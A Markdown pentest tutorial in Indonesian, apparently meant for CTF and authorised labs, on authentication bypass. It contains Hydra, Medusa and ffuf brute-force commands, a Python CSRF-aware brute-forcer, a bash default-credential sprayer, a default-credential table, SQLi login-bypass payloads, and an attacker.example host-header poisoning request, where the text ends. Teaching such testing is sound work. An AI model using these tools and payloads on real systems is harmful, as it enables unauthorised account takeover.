---
id: "18"
title: "🔐 18 — Authentication Bypass Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "18_authentication_bypass_workflow.md"
refs_out: ["05","06","07","14a","19"]
refs_in: ["15","17d","19","21","31","62"]
---

# 🔐 18 — Authentication Bypass Workflow

> **Scope:** HackTheBox, TryHackMe, Proving Grounds, dan lab yang memang memberikan izin pengujian.  
> **OS:** Parrot OS XFCE / Debian-based  
> **Level:** Beginner → Intermediate  
> **Goal:** Membangun _muscle memory_ untuk menemukan kelemahan authentication tanpa harus bergantung pada Google setiap langkah.

---

## 📚 Daftar Isi

- [🔐 0. Authentication Fundamentals](#-0-authentication-fundamentals)
    
- [🔎 1. Reconnaissance Authentication](#-1-reconnaissance-authentication)
    
    - [1.1 Identifikasi Login Page](#11-identifikasi-login-page)
        
    - [1.2 Identifikasi Authentication Mechanism](#12-identifikasi-authentication-mechanism)
        
    - [1.3 Username Enumeration](#13-username-enumeration-dulu)
        
- [💥 2. Brute Force Attack](#-2-brute-force-attack)
    
    - [2.1 Hydra Workflow](#21-hydra-workflow)
        
    - [Hydra dengan CSRF Token](#hydra-dengan-csrf-token)
        
    - [2.2 Medusa Workflow](#22-medusa-workflow)
        
    - [2.3 ffuf untuk Brute Force Web](#23-ffuf-untuk-brute-force-web)
        
    - [2.4 Wordlist Strategy](#24-wordlist-strategy)
        
- [🔑 3. Default Credentials](#-3-default-credentials)
    
    - [3.1 Tabel Default Credentials](#31-tabel-default-credentials)
        
    - [3.2 Default Credential Testing](#32-tool-default-credential-testing)
        
- [💉 4. SQL Injection Authentication Bypass](#-4-sql-injection-authentication-bypass)
    
    - [4.1 Classic SQLi Login Bypass](#41-classic-sqli-login-bypass)
        
    - [4.2 Cara Test SQLi Bypass](#42-cara-test-sqli-bypass)
        
    - [4.3 Blind SQLi di Login Form](#43-blind-sqli-di-login-form)
        
- [🔄 5. Password Reset Vulnerabilities](#-5-password-reset-vulnerabilities)
    
    - [5.1 Predictable Reset Token](#51-predictable-reset-token)
        
    - [5.2 Host Header Poisoning](#52-host-header-poisoning-di-password-reset)
        
    - [5.3 Token Reuse](#53-token-reuse)
        
    - [5.4 Username/Email Enumeration](#54-usernameemail-enumeration-via-reset)
        
- [🤖 6. CAPTCHA Bypass](#-6-captcha-bypass)
    
    - [6.1 Common CAPTCHA Bypass Methods](#61-common-captcha-bypass-methods)
        
- [🚪 7. Account Lockout Bypass](#-7-account-lockout-bypass)
    
    - [7.1 IP Rotation](#71-ip-rotation-bypass)
        
    - [7.2 Username Cycling](#72-username-cycling)
        
    - [7.3 Null Byte & Case Manipulation](#73-null-byte--case-manipulation)
        
- [🎫 8. JWT Authentication Bypass](#-8-jwt-authentication-bypass)
    
    - [8.1 JWT Structure](#81-jwt-structure)
        
    - [8.2 None Algorithm](#82-none-algorithm-attack)
        
    - [8.3 Weak Secret Brute Force](#83-weak-secret-brute-force)
        
    - [8.4 Algorithm Confusion](#84-algorithm-confusion-rs256--hs256)
        
- [🔗 9. OAuth & SSO Bypass](#-9-oauth--sso-bypass)
    
    - [9.1 OAuth Misconfigurations](#91-common-oauth-misconfigurations)
        
    - [9.2 SSO Bypass Patterns](#92-sso-bypass-patterns)
        
- [📱 10. MFA Bypass](#-10-mfa-bypass)
    
    - [10.1 OTP Bypass](#101-otp-bypass-techniques)
        
    - [10.2 Backup Code Abuse](#102-backup-code-abuse)
        
    - [10.3 Response Manipulation](#103-response-manipulation)
        
- [🍪 11. Session Token Analysis](#-11-session-token-analysis)
    
    - [11.1 Weak Session ID](#111-weak-session-id)
        
    - [11.2 Session Fixation](#112-session-fixation)
        
    - [11.3 Cookie Security Analysis](#113-cookie-security-analysis)
        
- [⚙️ 12. Automation Scripts](#-12-automation-scripts)
    
    - [12.1 auth_recon.sh](#121-script-auth_reconsh)
        
    - [12.2 login_bruteforce.sh](#122-script-login_bruteforce-sh)
        
    - [12.3 One-liners](#123-one-liners-collection)
        
- [🌳 13. Decision Tree](#-13-decision-tree)
    
- [🛠️ 14. Common Errors & Troubleshooting](#-14-common-errors--troubleshooting)
    

---

# 🔐 0. Authentication Fundamentals

## Apa yang Dilindungi Authentication?

**Authentication** menjawab:

> “Siapa kamu?”

Contoh:

```text
username + password
OTP
TOTP
security key
session cookie
JWT
OAuth identity
```

Authentication yang berhasil biasanya menghasilkan:

```text
Unauthenticated
      │
      ▼
[ Login / Verify Identity ]
      │
      ▼
Authenticated
      │
      ▼
Session / Token
```

---

## Authentication vs Authorization

```text
Authentication
     │
     └── Apakah user benar-benar "admin"?

Authorization
     │
     └── Setelah login, bolehkah user mengakses /admin?
```

Contoh:

```text
Alice login berhasil
        │
        ▼
Authentication = PASS

Alice membuka /admin
        │
        ▼
Authorization = FAIL
```

Jangan menganggap:

```text
Login berhasil = Admin Access
```

Keduanya berbeda.

---

## Kenapa Authentication Menjadi Target Prioritas?

Karena kelemahan authentication dapat langsung menghasilkan:

```text
Authentication Weakness
        │
        ├── Login Bypass
        ├── Credential Discovery
        ├── Session Takeover
        ├── Password Reset Abuse
        └── MFA Bypass
                 │
                 ▼
              Account
                 │
                 ▼
           Higher Privilege
```

---

## Authentication Flow Normal vs Vulnerable

### ✅ Normal

```text
User
 │
 │ username + password
 ▼
Login Endpoint
 │
 ├── verify username
 ├── verify password
 ├── verify account state
 └── create session
          │
          ▼
       Dashboard
```

### ❌ Vulnerable

```text
User
 │
 │ malformed / bypass input
 ▼
Login Endpoint
 │
 ├── weak validation
 ├── flawed query
 ├── predictable token
 ├── broken MFA logic
 └── incorrect auth state
          │
          ▼
   Authentication Bypass
          │
          ▼
       Dashboard
```

---

# 🔎 1. Reconnaissance Authentication

> **Rule:** Jangan langsung brute-force. Pahami dahulu mekanisme authentication.

Workflow:

```text
Login Page Found
      │
      ▼
Identify Mechanism
      │
      ▼
Enumerate Username
      │
      ▼
Default Credentials
      │
      ▼
Authentication Weakness Testing
```

---

# 1.1 Identifikasi Login Page

### 📌 Kapan Digunakan

Gunakan saat:

```text
http://TARGET/
```

belum jelas lokasi login page-nya.

---

## Manual: robots.txt

```bash
curl -i http://TARGET/robots.txt
```

Contoh:

```text
Disallow: /admin/
Disallow: /login/
Disallow: /portal/
```

Coba:

```bash
curl -I http://TARGET/login/
curl -I http://TARGET/admin/
curl -I http://TARGET/portal/
```

---

## Manual: sitemap.xml

```bash
curl -s http://TARGET/sitemap.xml
```

Cari endpoint:

```bash
curl -s http://TARGET/sitemap.xml | grep -Ei \
'login|signin|auth|admin|portal|account'
```

---

## Source Code

```bash
curl -s http://TARGET/ | grep -Ei \
'login|signin|auth|password|username'
```

Atau:

```bash
curl -s http://TARGET/login | grep -Ei \
'form|action|method|username|password'
```

---

## ffuf — Login Page Discovery

### 📌 Kapan Digunakan

Saat lokasi authentication belum diketahui dan ingin mencari endpoint umum.

Wordlist:

```bash
/usr/share/seclists/Discovery/Web-Content/common.txt
```

Command:

```bash
ffuf \
-u http://TARGET/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-mc 200,301,302,307,401,403 \
-fc 404
```

Search lebih spesifik:

```bash
ffuf \
-u http://TARGET/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-mc 200,301,302,307,401,403 \
-fc 404 \
-e .php,.html,.jsp,.asp,.aspx
```

Contoh:

```text
login                   [Status: 200, Size: 5312]
signin                  [Status: 200, Size: 5201]
admin                   [Status: 302, Size: 112]
```

Analisis:

```text
/login  → kemungkinan login
/admin  → kemungkinan panel administrative
/signin → kemungkinan authentication alias
```

---

## gobuster — Auth Endpoint Discovery

```bash
gobuster dir \
-u http://TARGET \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-x php,html,jsp,asp,aspx \
-s 200,204,301,302,307,401,403
```

Contoh:

```text
/login.php          (Status: 200)
/admin/             (Status: 302)
/user/login         (Status: 200)
/authenticate.php   (Status: 200)
```

---

## Diagram

```text
Target
 │
 ├── robots.txt
 ├── sitemap.xml
 ├── source code
 ├── ffuf
 └── gobuster
       │
       ▼
Authentication Endpoint
```

---

# 1.2 Identifikasi Authentication Mechanism

## Form-Based Login

### 📌 Kapan Digunakan

Gunakan saat login berupa:

```html
<form method="POST">
```

Periksa:

```bash
curl -s http://TARGET/login | grep -Ei \
'<form|input|password|username'
```

Contoh:

```html
<form action="/login" method="POST">
<input name="username">
<input name="password" type="password">
```

Flow:

```text
POST /login
username=test
password=test
```

---

## HTTP Basic Auth

### 📌 Kapan Digunakan

Saat server meminta HTTP authentication.

```bash
curl -i http://TARGET/protected/
```

Contoh:

```text
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Restricted Area"
```

Itu adalah indikator Basic Authentication.

Test:

```bash
curl -i -u test:test http://TARGET/protected/
```

---

## Token-Based Authentication

Cari:

```text
Authorization:
Bearer
Token
JWT
session
access_token
refresh_token
```

Contoh:

```http
Authorization: Bearer eyJhbGciOi...
```

---

## Cookie/Session Authentication

```bash
curl -i -c cookies.txt http://TARGET/login
```

Contoh:

```text
Set-Cookie: PHPSESSID=abc123; Path=/
```

---

## JWT

Ciri umum:

```text
eyJhbGciOiJIUzI1Ni...
```

JWT biasanya mempunyai:

```text
HEADER.PAYLOAD.SIGNATURE
```

---

## MFA / OTP

Ciri:

```text
OTP
TOTP
verification code
2FA
authenticator
```

Contoh request:

```http
POST /verify-otp
otp=123456
```

---

## OAuth / SSO

Cari:

```text
/oauth
/authorize
/callback
/login/google
/login/github
/sso
```

Response sering berisi:

```text
redirect_uri
client_id
scope
state
code
```

---

# 1.3 Username Enumeration Dulu

## 📌 Kapan Digunakan

Sebelum password brute force.

Tujuannya:

```text
Jangan:
1000 username × 100000 password

Lebih baik:
10 username valid × password candidates
```

Username enumeration dapat mengurangi search space secara drastis.

---

## Metode 1 — Error Message Differences

Test:

```bash
curl -s -X POST http://TARGET/login \
-d 'username=admin&password=wrong'
```

Bandingkan:

```bash
curl -s -X POST http://TARGET/login \
-d 'username=randomuser123&password=wrong'
```

Contoh:

```text
admin:

Invalid password

randomuser123:

User does not exist
```

Kesimpulan:

```text
admin        = kemungkinan valid
randomuser   = kemungkinan invalid
```

---

## Compare Response dengan diff

```bash
curl -s -X POST http://TARGET/login \
-d 'username=admin&password=wrong' \
-o admin.txt

curl -s -X POST http://TARGET/login \
-d 'username=randomuser123&password=wrong' \
-o random.txt

diff -u random.txt admin.txt
```

---

## Metode 2 — Timing Difference

### 📌 Kapan Digunakan

Saat response body tampak identik.

Ukur:

```bash
time curl -s -o /dev/null \
-X POST http://TARGET/login \
-d 'username=admin&password=x'
```

Bandingkan:

```bash
time curl -s -o /dev/null \
-X POST http://TARGET/login \
-d 'username=randomuser123&password=x'
```

Contoh:

```text
admin:
real  0m0.183s

randomuser:
real  0m0.012s
```

Ini **indikasi**, bukan bukti tunggal.

Ulangi beberapa kali agar tidak salah karena network jitter.

---

## Metode 3 — Registration Page

Coba:

```text
/register
/signup
```

Masukkan username kandidat.

Contoh:

```text
Username "admin" already exists
```

Ini bisa mengonfirmasi username valid.

---

## Metode 4 — Forgot Password

Cari:

```text
/forgot-password
/reset-password
```

Test:

```bash
curl -i -X POST http://TARGET/forgot-password \
-d 'username=admin'
```

Bandingkan dengan username random.

---

## Metode 5 — API Enumeration

Cari JavaScript:

```bash
curl -s http://TARGET/app.js | grep -Eo \
'[/A-Za-z0-9_-]*(login|auth|user|account|reset)[^"'\" ]*'
```

Cek endpoint:

```text
/api/login
/api/auth
/api/users
/api/account
/api/reset
```

---

## Diagram Username Enumeration

```text
Login / Register / Reset
          │
          ▼
   username candidate
          │
          ▼
 ┌────────────────────┐
 │ Error difference?  │
 └─────────┬──────────┘
           │
     ┌─────┴─────┐
    YES          NO
     │            │
     ▼            ▼
 username       timing
 likely valid   analysis
```

---

# 💥 2. Brute Force Attack

> Gunakan hanya pada target CTF/lab atau sistem yang memang Anda berwenang menguji.

---

# 2.1 Hydra Workflow

## 📌 Kapan Digunakan

Gunakan Hydra ketika:

```text
username sudah diketahui
AND
authentication mechanism dapat dipahami
AND
response gagal dapat diidentifikasi
```

Workflow:

```text
Burp Intercept
      │
      ▼
Identify:
username parameter
password parameter
failure condition
      │
      ▼
Hydra
      │
      ▼
Valid credential
```

---

## Identifikasi Parameter dengan Burp

Contoh request:

```http
POST /login HTTP/1.1
Host: target.htb
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
```

Parameter:

```text
username=admin
password=test
```

Failure:

```text
Invalid credentials
```

---

## Hydra — Web Form

Sintaks:

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou.txt \
TARGET \
http-post-form \
"/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

Contoh lengkap:

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou.txt \
192.168.56.101 \
http-post-form \
"/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
-f -t 4 -w 5 -v
```

---

## Hydra — HTTP Basic Auth

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou.txt \
TARGET \
http-get /protected \
-f -t 4 -V
```

---

## Hydra — SSH

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou.txt \
ssh://TARGET \
-f -t 4 -v
```

---

## Hydra — FTP

```bash
hydra -l admin \
-P /usr/share/wordlists/rockyou.txt \
ftp://TARGET \
-f -t 4 -v
```

---

## Flag Penting

|Flag|Fungsi|
|---|---|
|`-f`|stop setelah credential ditemukan|
|`-t`|jumlah parallel tasks|
|`-w`|timeout/wait|
|`-v`|verbose|
|`-V`|tampilkan setiap credential yang dicoba|
|`-l`|single username|
|`-L`|username list|
|`-p`|single password|
|`-P`|password list|

---

## Berhasil

Contoh:

```text
[22][ssh] host: 10.10.10.5
login: admin
password: football
```

Artinya:

```text
username = admin
password = football
```

---

## Gagal

```text
0 valid passwords found
```

Jangan langsung menyimpulkan:

```text
"password tidak ada"
```

Bisa saja:

```text
failure condition salah
CSRF
lockout
rate limit
wrong endpoint
wrong parameter
```

---

## Hydra dengan CSRF Token

### 📌 Kapan Digunakan
Ketika form login memiliki hidden field CSRF token (misal: `_token`, `csrf_token`, `csrfmiddlewaretoken`) yang nilainya berubah dinamis pada setiap request GET baru.

Hydra standar tidak dirancang untuk mem-parse respons GET dan mengekstrak token CSRF sebelum melakukan POST secara otomatis. Jika form login memiliki CSRF token dinamis, brute force menggunakan Hydra biasa akan selalu gagal.

### 🔍 Ciri Form dengan CSRF Token
Periksa kode HTML form login target menggunakan `curl`:

```bash
curl -s http://TARGET/login | grep -i 'csrf\|token\|_token'
```

Contoh output yang menunjukkan hidden input CSRF:

```html
<input type="hidden" name="_token" value="abc123xyz789">
```

### 🐍 Solusi Andal: Python Script dengan Dynamic CSRF Handling
Gunakan `requests.Session()` untuk mempertahankan sesi cookie, mengambil CSRF token baru pada setiap percobaan, lalu mengirimkan request POST:

```python
#!/usr/bin/env python3
# login_csrf.py - Login Brute Force dengan Dynamic CSRF Token Handling

import requests
import re
import sys

TARGET = "http://TARGET"
LOGIN_URL = f"{TARGET}/login"

# Baca wordlist password (ambil 1000 password teratas untuk CTF)
with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()][:1000]

session = requests.Session()

print(f"[*] Memulai brute force terhadap {LOGIN_URL} dengan dynamic CSRF handling...")

for password in passwords:
    # Step 1: Ambil halaman login untuk mengekstrak CSRF token terbaru
    try:
        r = session.get(LOGIN_URL, timeout=5)
    except requests.RequestException as e:
        print(f"[-] Request error: {e}")
        continue

    # Regex untuk mengekstrak atribut value dari token hidden field
    token = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
    if not token:
        # Alternatif pola regex untuk id/name csrf lain
        token = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)

    if not token:
        print("[-] CSRF token tidak ditemukan pada respons!")
        break

    csrf = token.group(1)

    # Step 2: Kirim POST login bersama CSRF token valid
    data = {
        "username": "admin",
        "password": password,
        "_token": csrf
    }

    try:
        res = session.post(LOGIN_URL, data=data, allow_redirects=False, timeout=5)
    except requests.RequestException as e:
        print(f"[-] Post error: {e}")
        continue

    # Evaluasi respons login (status 302 redirect atau teks dashboard)
    if res.status_code == 302 or "dashboard" in res.text.lower() or "logout" in res.text.lower():
        print(f"\n[+] BERHASIL! Password valid ditemukan: {password}")
        sys.exit(0)
    else:
        print(f"[-] Mencoba password: {password} (Gagal)")

print("[-] Brute force selesai. Password tidak ditemukan dalam wordlist.")
```

Jalankan script:

```bash
python3 login_csrf.py
```

---

# 2.2 Medusa Workflow

## 📌 Kapan Digunakan

Medusa adalah tool paralel authentication testing berbasis modular yang dapat menjadi alternatif Hydra.

> **💡 Realita Praktis untuk CTF:**
> Menggunakan Medusa untuk web form (`http-form`) relatif rumit karena modul HTTP web form sering kali tidak terpasang secara seragam atau membutuhkan konfigurasi parameter yang kaku.
>
> **Aturan Praktis Pemilihan Tool:**
> - **HTTP Basic Auth:** `Medusa` (`-M http`) atau `Hydra` sama baiknya.
> - **Web Form POST (Login Form Website):** `Hydra` (`http-post-form`) atau `ffuf` jauh lebih mudah dikontrol dan andal.
> - **Layanan Jaringan (SSH / FTP / SMB):** `Medusa` dan `Hydra` sama-sama tangguh. Gunakan Medusa terutama jika Hydra mengalami kendala stabilitas thread.

### Menjalankan Medusa pada Network Services (SSH)
Gunakan Medusa jika Hydra bermasalah atau untuk verifikasi kredensial service:

```bash
medusa -h TARGET -u admin \
  -P /usr/share/wordlists/rockyou.txt \
  -M ssh -t 4
```

### Memeriksa Modul yang Tersedia di Sistem
Periksa modul apa saja yang terpasang pada instalasi Medusa di Parrot OS:

```bash
medusa -d
```

Contoh output:

```text
Available modules:
ssh
ftp
http
...
```

### Penggunaan Modul HTTP (Basic Authentication)
Untuk target dengan HTTP Basic Authentication:

```bash
medusa \
  -h TARGET \
  -u admin \
  -P /usr/share/wordlists/rockyou.txt \
  -M http -m USER-AGENT:"Mozilla/5.0"
```

Contoh output:

```text
ACCOUNT FOUND:
Host: 10.10.10.5
User: admin
Password: football
```

---

# 2.3 ffuf untuk Brute Force Web

## 📌 Kapan Digunakan

ffuf berguna ketika login request sederhana dan nilai password dapat langsung difuzz melalui HTTP POST.

Contoh:

```http
POST /login

username=admin&password=FUZZ
```

### Metodologi 2 Langkah Menentukan Filter Size (`-fs`):
> **⚠️ Catatan Penting:** Parameter `-fs` (Filter Size) menyaring respons gagal agar tidak membanjiri terminal. Nilai ukuran (misal `1234`) **bukan tebakan acak**, melainkan harus diukur terlebih dahulu dari respons saat login gagal!

#### Langkah 1: Dapatkan Baseline Size Response Gagal
Kirim kredensial yang sengaja salah menggunakan `curl` dan hitung ukuran karakternya (`wc -c`):

```bash
curl -s -X POST http://TARGET/login \
  -d 'username=admin&password=WRONGPASSWORD_BASELINE_123' | wc -c
# Misal output: 1234
```

#### Langkah 2: Masukkan Nilai Baseline ke Parameter `-fs` ffuf
Gunakan angka baseline yang didapat pada Langkah 1 untuk mengabaikan seluruh respons login yang gagal:

```bash
ffuf \
  -u http://TARGET/login \
  -X POST \
  -d 'username=admin&password=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -w /usr/share/wordlists/rockyou.txt \
  -fs 1234  # Angka 1234 adalah baseline response size gagal dari Langkah 1
```

---

## Filter Status Code

```bash
ffuf \
-u http://TARGET/login \
-X POST \
-d 'username=admin&password=FUZZ' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-w /usr/share/wordlists/rockyou.txt \
-mc 200,302 \
-fs 1234
```

---

## Dengan Cookie

```bash
ffuf \
-u http://TARGET/login \
-X POST \
-d 'username=admin&password=FUZZ' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Cookie: PHPSESSID=SESSIONID' \
-w /usr/share/wordlists/rockyou.txt \
-fs 1234
```

---

## Expected Output

```text
football            [Status: 302, Size: 98]
password123         [Status: 200, Size: 1420]
```

Fokus:

```text
Status berbeda
Size berbeda
Words berbeda
Lines berbeda
```

Jangan hanya mencari HTTP `200`.

---

# 2.4 Wordlist Strategy

## rockyou.txt

Lokasi umum:

```bash
/usr/share/wordlists/rockyou.txt
```

Sering terkompresi:

```bash
# Cek ketersediaan wordlist rockyou terlebih dahulu:
ls -la /usr/share/wordlists/rockyou*
```

Jika hanya tersedia file terkompresi `.gz` (`rockyou.txt.gz`):

```bash
# Decompress menggunakan gunzip:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# ATAU menggunakan gzip -d:
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

*(Catatan: Di Parrot OS, file `rockyou.txt` biasanya sudah diekstrak secara default, sehingga selalu periksa dengan `ls -la` terlebih dahulu)*.

---

## SecLists

Path umum:

```bash
/usr/share/seclists/
```

Cek:

```bash
find /usr/share/seclists -maxdepth 2 -type f | head
```

Password:

```bash
/usr/share/seclists/Passwords/
```

Contoh:

```bash
find /usr/share/seclists/Passwords -type f | head -30
```

---

## Custom Wordlist dengan CeWL

### 📌 Kapan Digunakan

Ketika target CTF memiliki tema khusus:

```text
nama perusahaan
produk
anggota team
domain
brand
project name
```

Command:

```bash
cewl http://TARGET -w target_words.txt
```

Dengan depth:

```bash
cewl -d 2 http://TARGET -w target_words.txt
```

Hasil:

```bash
wc -l target_words.txt
head target_words.txt
```

---

## Mutation dengan Hashcat Rules

Contoh kombinasi menggunakan rule:

```bash
hashcat \
--stdout \
target_words.txt \
-r /usr/share/hashcat/rules/best64.rule \
> mutated_words.txt
```

---

## Username sebagai Password

Pada CTF tertentu:

```text
username = admin
password = admin
```

Test manual dahulu:

```bash
curl -i -X POST http://TARGET/login \
-d 'username=admin&password=admin'
```

---

# 🔑 3. Default Credentials

## 3.1 Tabel Default Credentials

> **Catatan:** tabel ini adalah daftar kandidat yang lazim ditemui pada perangkat/aplikasi legacy atau lab. Jangan mengasumsikan credential masih default.

|Platform|Default User|Default Pass|Login URL|
|---|---|---|---|
|WordPress|admin|admin|`/wp-login.php`|
|WordPress|admin|password|`/wp-login.php`|
|Joomla|admin|admin|`/administrator/`|
|Drupal|admin|admin|`/user/login`|
|Tomcat|admin|admin|`/manager/html`|
|Tomcat|tomcat|tomcat|`/manager/html`|
|Jenkins|admin|admin|`/login`|
|phpMyAdmin|root|root|`/phpmyadmin/`|
|phpMyAdmin|root|empty|`/phpmyadmin/`|
|Webmin|root|toor|`:10000/`|
|Grafana|admin|admin|`/login`|
|Kibana|elastic|changeme|`/login`|
|Elasticsearch|elastic|changeme|`:9200/`|
|MongoDB|admin|admin|`:27017`|
|Redis|—|—|`:6379`|
|PostgreSQL|postgres|postgres|`:5432`|
|MySQL|root|root|`:3306`|
|MariaDB|root|root|`:3306`|
|FTP|ftp|ftp|`:21`|
|FTP|anonymous|anonymous|`:21`|
|SSH|root|root|`:22`|
|SSH|admin|admin|`:22`|
|Cisco IOS|cisco|cisco|device CLI|
|Cisco IOS|admin|admin|device CLI|
|MikroTik|admin|empty|`:8291`|
|pfSense|admin|pfsense|`/`|
|OpenWrt|root|empty|`/cgi-bin/luci/`|
|Raspberry Pi legacy|pi|raspberry|SSH|
|Synology|admin|admin|DSM|
|D-Link legacy|admin|admin|Web UI|
|TP-Link legacy|admin|admin|Web UI|
|Hikvision legacy|admin|12345|Web UI|
|DVR/NVR legacy|admin|12345|Web UI|

> Credential default pada produk berubah menurut firmware/version. Untuk CTF, gunakan hanya sebagai kandidat awal dan cocokkan dengan challenge context.

---

# 3.2 Tool: Default Credential Testing

## changeme

Cari apakah tersedia:

```bash
command -v changeme
```

Informasi:

```bash
changeme --help
```

Jika tidak terpasang:

```bash
apt-cache search changeme
```

---

## Manual dengan curl

```bash
curl -i -u admin:admin http://TARGET/admin/
```

Form login:

```bash
curl -i -X POST http://TARGET/login \
-d 'username=admin&password=admin'
```

---

## Spray Default Credentials — Bash

> Gunakan hanya pada lab/target yang diizinkan.

```bash
#!/usr/bin/env bash

set -euo pipefail

if [[ $# -ne 2 ]]; then
    echo "Usage: $0 <login_url> <username>"
    exit 1
fi

URL="$1"
USER="$2"

if [[ ! "$URL" =~ ^https?:// ]]; then
    echo "[!] URL must start with http:// or https://"
    exit 1
fi

if [[ ! "$USER" =~ ^[a-zA-Z0-9._-]+$ ]]; then
    echo "[!] Invalid username format"
    exit 1
fi

PASSWORDS=(
    "admin"
    "password"
    "password123"
    "admin123"
    "root"
    "toor"
    "123456"
    "12345678"
)

for PASS in "${PASSWORDS[@]}"; do
    echo "[*] Testing $USER:$PASS"

    RESPONSE="$(
        curl -ksS -X POST \
        --data-urlencode "username=$USER" \
        --data-urlencode "password=$PASS" \
        "$URL" || true
    )"

    if echo "$RESPONSE" | grep -Eqi \
        'dashboard|logout|welcome|admin panel'; then
        echo "[+] Possible valid credential: $USER:$PASS"
        exit 0
    fi
done

echo "[-] No obvious default credential found."
```

---

# 💉 4. SQL Injection Authentication Bypass

> **Scope:** hanya login bypass. SQLi exploitation penuh dibahas di **File 19 — SQL Injection**.

---

# 4.1 Classic SQLi Login Bypass

## 📌 Kapan Digunakan

Gunakan ketika login backend diduga membangun SQL query dari input secara langsung, misalnya:

```sql
SELECT * FROM users
WHERE username='$username'
AND password='$password';
```

Input:

```text
admin'--
```

dapat mengubah query menjadi konsep:

```sql
SELECT * FROM users
WHERE username='admin'--'
AND password='...';
```

Komentar SQL menyebabkan bagian berikutnya diabaikan pada database/dialect tertentu.

---

## Payload Collection

> Payload harus disesuaikan dengan quoting, SQL dialect, dan cara backend membangun query.

### Comment-based

```text
admin'--
admin'#
admin'/*
admin'-- -
```

### Boolean-based

```text
' OR 1=1--
' OR 1=1#
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
1' OR 1=1--
1' OR 1=1#
1' OR '1'='1'--
admin' OR '1'='1'--
admin' OR 1=1--
' OR 1=1 LIMIT 1--
') OR ('1'='1
') OR 1=1--
```

Lebih dari 15 payload:

```text
01  admin'--
02  admin'#
03  admin'/*
04  admin'-- -
05  ' OR 1=1--
06  ' OR 1=1#
07  ' OR '1'='1
08  ' OR '1'='1'--
09  ' OR '1'='1'#
10  1' OR 1=1--
11  1' OR 1=1#
12  1' OR '1'='1'--
13  admin' OR '1'='1'--
14  admin' OR 1=1--
15  ' OR 1=1 LIMIT 1--
16  ') OR ('1'='1
17  ') OR 1=1--
18  ') OR ('a'='a
```

---

## Diagram

```text
username input
      │
      ▼
SQL Query Construction
      │
      ├── Normal input
      │      │
      │      ▼
      │   Password checked
      │
      └── Injection
             │
             ▼
       WHERE condition altered
             │
             ▼
        Authentication bypass
```

---

# 4.2 Cara Test SQLi Bypass

## Manual via Browser

Masukkan:

```text
Username:
admin'--

Password:
anything
```

Observe:

```text
Login success
Login fail
SQL error
Generic error
Redirect
```

---

## curl

```bash
curl -i -X POST http://TARGET/login \
-d "username=admin%27--" \
-d "password=test"
```

Alternatif:

```bash
curl -i -X POST http://TARGET/login \
--data-urlencode "username=admin'--" \
--data-urlencode "password=test"
```

Perhatikan:

```text
HTTP status
Location
Set-Cookie
response size
dashboard indicators
```

---

## Burp Suite

Flow:

```text
Browser
   │
   ▼
Burp Proxy
   │
   ▼
Intercept request
   │
   ▼
Send to Repeater
   │
   ├── normal credentials
   ├── payload #1
   ├── payload #2
   └── payload #3
          │
          ▼
       Compare
```

Bandingkan:

```text
Status
Length
Headers
Cookies
Body
Redirect
```

---

## sqlmap — Login Form

### 📌 Kapan Digunakan

Saat aplikasi menunjukkan indikasi SQLi dan Anda ingin memvalidasi parameter form.

Dengan URL login:

```bash
sqlmap \
-u "http://TARGET/login" \
--forms \
--batch
```

Dengan cookie/session:

```bash
sqlmap \
-u "http://TARGET/login" \
--forms \
--cookie="PHPSESSID=SESSION" \
--batch
```

> `--forms` membuat sqlmap mencari form HTML. SQLmap bukan pengganti pemahaman request manual; pahami request dengan Burp terlebih dahulu.

---

# 4.3 Blind SQLi di Login Form

## 📌 Kapan Digunakan

Ketika tidak ada SQL error yang terlihat.

Tiga kemungkinan:

```text
TRUE
FALSE
TIME DELAY
```

---

## Boolean-Based

Normal:

```text
admin + wrongpassword
```

Test kondisi true:

```text
' OR 1=1--
```

Test kondisi false:

```text
' AND 1=2--
```

Bandingkan:

```text
Response A
Response B
```

---

## Time-Based

### MySQL/MariaDB concept

```text
' OR SLEEP(5)--
```

Gunakan hanya saat aplikasi/DB mendukung dan pada lab.

Dengan curl:

```bash
time curl -s -o /dev/null \
-X POST http://TARGET/login \
--data-urlencode "username=' OR SLEEP(5)--" \
--data-urlencode "password=x"
```

Expected:

```text
normal request  ≈ 0.1s
injected request ≈ 5s
```

---

# 🔄 5. Password Reset Vulnerabilities

---

# 5.1 Predictable Reset Token

## 📌 Kapan Digunakan

Saat reset token terlihat:

```text
pendek
sequential
timestamp-based
username-derived
MD5 sederhana
```

Contoh:

```text
/reset?token=1725192300
```

atau:

```text
/reset?token=admin1725192300
```

---

## Pattern Analysis

Kumpulkan beberapa token dari lab:

```text
token1 = ...
token2 = ...
token3 = ...
```

Perhatikan:

```text
length
charset
prefix
suffix
time correlation
increment
```

---

## Timestamp-Based Token

Misalnya:

```text
1710001000
1710001001
1710001002
```

Ini adalah indikator token mungkin berhubungan dengan timestamp.

Jangan langsung menganggap pasti vulnerable. Uji:

```text
request time
token generation time
multiple accounts
multiple resets
```

---

# 5.2 Host Header Poisoning di Password Reset

## 📌 Kapan Digunakan

Saat aplikasi membuat password-reset link berdasarkan HTTP `Host`:

```text
https://HOST/reset?token=...
```

Test pada lab:

```bash
curl -i \
-H 'Host: attacker.example' \
-X POST \
-d 'email=victim@example.com' \
http://TARGET/forgot-password
```

Variasi:

```bash
curl -i \
-H 'X-Forwarded-Host: attacker.example' \
-X POST \
-d 'email=victim@example.com' \
